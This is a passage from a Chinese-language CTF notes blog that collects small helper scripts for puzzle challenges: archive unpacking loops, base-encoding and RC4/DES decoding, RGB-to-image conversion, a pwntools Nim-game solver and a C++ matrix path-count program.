function_">get_FileModifyTime</span>(<span class="hljs-params">filePath</span>):<br>t = os.path.getmtime(filePath)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;时间戳:<span class="hljs-subst">&#123;t&#125;</span>\n时间:<span class="hljs-subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="嵌套zip文件解压"><a href="#嵌套zip文件解压" class="headerlink" title="嵌套zip文件解压"></a>嵌套zip文件解压</h2><h3 id="根据名称"><a href="#根据名称" class="headerlink" title="根据名称"></a>根据名称</h3><p><a href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>和<a href="https://docs.python.org/zh-cn/3/library/zipfile.html">zipfile参考</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br>name = <span class="hljs-string">&#x27;0573&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    fz = zipfile.ZipFile(name + <span class="hljs-string">&#x27;.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    fz.extractall(pwd=<span class="hljs-built_in">bytes</span>(name, <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    name = fz.filelist[<span class="hljs-number">0</span>].filename[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>    fz.close()<br></code></pre></td></tr></table></figure><h3 id="根据后缀并解压至当前目录"><a href="#根据后缀并解压至当前目录" class="headerlink" title="根据后缀并解压至当前目录"></a>根据后缀并解压至当前目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># https://unix.stackexchange.com/questions/4367/extracting-nested-zip-files</span><br><span class="hljs-comment"># https://askubuntu.com/questions/146634/shell-script-to-move-all-files-from-subfolders-to-parent-folder</span><br><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;`find . -type f -name &#x27;*.zip&#x27; | wc -l`&quot;</span> &gt; 0 ]<br><span class="hljs-keyword">do</span><br>    unzip *.zip<br>    <span class="hljs-built_in">rm</span> *.zip<br>    find . -mindepth 2 -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">print</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">mv</span> &#123;&#125; . \;<br>    <span class="hljs-built_in">rmdir</span> */<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip">https://github.com/D-SEK-CTF/tcp1p-2023-writeup/tree/main/misc/zipzipzip</a></p><h2 id="python根据RGB数据生成图片"><a href="#python根据RGB数据生成图片" class="headerlink" title="python根据RGB数据生成图片"></a>python根据RGB数据生成图片</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/109585465">来源</a>及<a href="https://blog.csdn.net/weixin_43790276/article/details/108478270">PIL参考</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>x = y = <span class="hljs-number">200</span><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(x,y))<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./qr.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><br><span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,x):<br>    <span class="hljs-keyword">for</span> height <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,y):<br>        line = file.readline()<br>        rgb = line.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        img.putpixel((width,height),(<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">1</span>]),<span class="hljs-built_in">int</span>(rgb[<span class="hljs-number">2</span>])))<br>img.save(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="多重base64-16-32-85混合套娃解密脚本"><a href="#多重base64-16-32-85混合套娃解密脚本" class="headerlink" title="多重base64|16|32|85混合套娃解密脚本"></a>多重base64|16|32|85混合套娃解密脚本</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/109829704">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baseDec</span>(<span class="hljs-params">text,<span class="hljs-built_in">type</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> base64.b16decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> base64.b32decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> base64.b85decode(text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">autoDec</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;MRCTF&#123;&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>+text.decode())<br>            <span class="hljs-keyword">break</span><br><br>        code = detect(text)<br>        text = baseDec(text,code)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br><br>autoDec(flag)<br></code></pre></td></tr></table></figure><h2 id="汇编指令与机器码对照表"><a href="#汇编指令与机器码对照表" class="headerlink" title="汇编指令与机器码对照表"></a>汇编指令与机器码对照表</h2><p><a href="https://www.jianshu.com/p/7835b5526854">链接</a></p><h2 id="python运算符优先级"><a href="#python运算符优先级" class="headerlink" title="python运算符优先级"></a>python运算符优先级</h2><p><a href="http://c.biancheng.net/view/2190.html">链接</a></p><h2 id="python以大端和小端处理数据"><a href="#python以大端和小端处理数据" class="headerlink" title="python以大端和小端处理数据"></a>python以大端和小端处理数据</h2><p><a href="https://blog.csdn.net/MikeCoke/article/details/113796480">题目及来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br>s = [<span class="hljs-number">72143238992041641000000.000000</span>,<span class="hljs-number">77135357178006504000000000000000.000000</span>,<span class="hljs-number">1125868345616435400000000.000000</span>,<span class="hljs-number">67378029765916820000000.000000</span>,<span class="hljs-number">75553486092184703000000000000.000000</span>,<span class="hljs-number">4397611913739958700000.000000</span>,<span class="hljs-number">76209378028621039000000000000000.000000</span>]<br>a = <span class="hljs-string">&#x27;&#x27;</span><br>b = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    i = <span class="hljs-built_in">float</span>(i)<br>    a += struct.pack(<span class="hljs-string">&#x27;&lt;f&#x27;</span>,i).<span class="hljs-built_in">hex</span>()        <span class="hljs-comment">#小端</span><br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>    i = <span class="hljs-built_in">float</span>(i)<br>    b += struct.pack(<span class="hljs-string">&#x27;&gt;f&#x27;</span>,i).<span class="hljs-built_in">hex</span>()        <span class="hljs-comment">#大端</span><br><span class="hljs-built_in">print</span>(b)<br><br>a = <span class="hljs-number">0x496e74657265737472696e67204964656120746f20656e6372797074</span><br>b = <span class="hljs-number">0x74707972747079727470797274707972747079727470797274707972</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-built_in">print</span>(long_to_bytes(b))<br></code></pre></td></tr></table></figure><h2 id="RC4加密脚本"><a href="#RC4加密脚本" class="headerlink" title="RC4加密脚本"></a>RC4加密脚本</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/105661450">题目及来源</a>。RC4加密和解密都是一个方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>): <span class="hljs-comment">#返回加密后的内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)) <br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密钥</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br><span class="hljs-comment">#print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span><br></code></pre></td></tr></table></figure><h2 id="SSH连接远程服务器"><a href="#SSH连接远程服务器" class="headerlink" title="SSH连接远程服务器"></a>SSH连接远程服务器</h2><p>假设用户名是root，服务器为node4.buuoj.cn，端口25298，则这样连接：</p><ul><li>ssh -p 25298 <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#110;&#111;&#x64;&#x65;&#52;&#x2e;&#x62;&#117;&#117;&#111;&#106;&#x2e;&#99;&#x6e;">&#x72;&#x6f;&#111;&#116;&#x40;&#110;&#111;&#x64;&#x65;&#52;&#x2e;&#x62;&#117;&#117;&#111;&#106;&#x2e;&#99;&#x6e;</a></li></ul><p>更多ssh参考<a href="https://blog.csdn.net/li528405176/article/details/82810342">此处</a>。</p><h2 id="python-Crypto解密des密文"><a href="#python-Crypto解密des密文" class="headerlink" title="python Crypto解密des密文"></a>python Crypto解密des密文</h2><p><a href="https://www.anquanke.com/post/id/181019#h3-15">题目及来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br>key = <span class="hljs-string">b&quot;t\x00e\x00s\x00t\x00&quot;</span><br>des = DES.new(key, mode = DES.MODE_CBC, iv = key)<br>a = <span class="hljs-string">b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;</span><br>a = base64.b64decode(a)<br>res = des.decrypt(a)[<span class="hljs-number">0</span>:-<span class="hljs-number">6</span>].decode(<span class="hljs-string">&quot;utf-16&quot;</span>)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="常见算法特征总结"><a href="#常见算法特征总结" class="headerlink" title="常见算法特征总结"></a>常见算法特征总结</h2><p><a href="https://b0ldfrev.gitbook.io/note/miscellaneous/suan-fa-te-zheng-zong-jie">链接</a></p><h2 id="GCC编译C文件为可执行文件"><a href="#GCC编译C文件为可执行文件" class="headerlink" title="GCC编译C文件为可执行文件"></a>GCC编译C文件为可执行文件</h2><ul><li>gcc source.c -o result.o</li></ul><h2 id="套娃压缩文件解压bash脚本"><a href="#套娃压缩文件解压bash脚本" class="headerlink" title="套娃压缩文件解压bash脚本"></a>套娃压缩文件解压bash脚本</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/110051084">例题及来源</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot;</span> -gt 0 ]; <span class="hljs-keyword">do</span> find -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.tar.xz&quot;</span> -<span class="hljs-built_in">exec</span> tar xf <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \; -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -- <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \;; <span class="hljs-keyword">done</span>;<br></code></pre></td></tr></table></figure><h2 id="Nim博弈pwntools交互"><a href="#Nim博弈pwntools交互" class="headerlink" title="Nim博弈pwntools交互"></a>Nim博弈pwntools交互</h2><p><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#catnim">来源</a>。有关nim博弈可以参考<a href="https://zhuanlan.zhihu.com/p/422562139">此处</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pile</span>():<br>    p.recvuntil(<span class="hljs-string">&#x27;Now pile: &#x27;</span>)<br>    line=p.recvline()[:-<span class="hljs-number">1</span>].decode()<br>    <span class="hljs-keyword">return</span> line.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_xor</span>(<span class="hljs-params">piles</span>):<br>    v=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> piles:<br>        v^=num<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;xor :&quot;</span>,v)<br>    <span class="hljs-keyword">return</span> v<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choose</span>(<span class="hljs-params">piles</span>):<br>    v=get_xor(piles)<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> piles:<br>        <span class="hljs-keyword">if</span> num-(num^v) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> i,num-(num^v)<br>        i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>,<span class="hljs-literal">None</span><br>p=remote(<span class="hljs-string">&#x27;223.112.5.156&#x27;</span>,<span class="hljs-number">55068</span>)<br>p.sendline(<span class="hljs-string">&#x27;N&#x27;</span>)<br>start=time.time()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    piles=get_pile()<br>    pilesnum=[<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> piles]<br>    where,cnt=choose(pilesnum)<br>    <span class="hljs-built_in">print</span>(pilesnum)<br>    s=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> pilesnum:<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-number">0</span>:<br>            s+=<span class="hljs-number">1</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;where:&#x27;</span>,<span class="hljs-built_in">str</span>(where))<br>    p.sendlineafter(<span class="hljs-string">&#x27;count:&#x27;</span>,<span class="hljs-built_in">str</span>(cnt))<br>    <span class="hljs-keyword">if</span> s==<span class="hljs-built_in">len</span>(pilesnum)-<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    piles=get_pile()<br><span class="hljs-built_in">print</span>(time.time()-start)<br>p.interactive()<br><span class="hljs-comment">#print(pilesnum)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="路径编程问题"><a href="#路径编程问题" class="headerlink" title="路径编程问题"></a>路径编程问题</h2><p>从m点到 n 点走 k 步的<a href="https://blog.csdn.net/bbbbswbq/article/details/81177945">路径条数问题</a>。<a href="https://blog.csdn.net/qq_41956187/article/details/105731368">题目及来源</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">105</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> mod = <span class="hljs-number">10003</span>;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span><br>&#123;<br>    <span class="hljs-type">int</span> a[N][N];<br>&#125;;<br>node c, ans;<br><span class="hljs-type">int</span> n;<br><span class="hljs-function">node <span class="hljs-title">mul</span><span class="hljs-params">(node x, node y)</span></span><br><span class="hljs-function"></span>&#123;<br>    node ans;<br>    <span class="hljs-built_in">memset</span>(ans.a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ans.a));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (x.a[i][k])<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++)<br>                &#123;<br>                    ans.a[i][j] += x.a[i][k] * y.a[k][j];<br>                    ans.a[i][j] %= mod;<br>                &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function">node <span class="hljs-title">Pow</span><span class="hljs-params">(node x, <span class="hljs-type">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br>    node ans;<br>    <span class="hljs-built_in">memset</span>(ans.a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ans.a));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        ans.a[i][i] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (m)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (m &amp; <span class="hljs-number">1</span>)<br>            ans = <span class="hljs-built_in">mul</span>(ans, x);<br>        x = <span class="hljs-built_in">mul</span>(x, x);<br>        m &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">freopen</span>(<span class="hljs-string">&quot;yyh.in&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,stdin);<br>    <span class="hljs-built_in">freopen</span>(<span class="hljs-string">&quot;out&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,stdout);<br>    <span class="hljs-type">int</span> m, u, v, step;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;m, &amp;step);<br>    <span class="hljs-built_in">memset</span>(c.a, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(c.a));<br>    <span class="hljs-keyword">while</span> (m--)&#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;u, &amp;v);<br>        c.a[u][v] = c.a[v][u] = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    ans = <span class="hljs-built_in">Pow</span>(c, step);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ans.a[<span class="hljs-number">1</span>][n]);<br>    <span class="hljs-built_in">fclose</span>(stdin);<br>    <span class="hljs-built_in">fclose</span>(stdout);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="python-pickle-opcodes参考"><a href="#python-pickle-opcodes参考" class="headerlink" title="python pickle opcodes参考"></a>python pickle opcodes参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">来源</a>。例题:<a 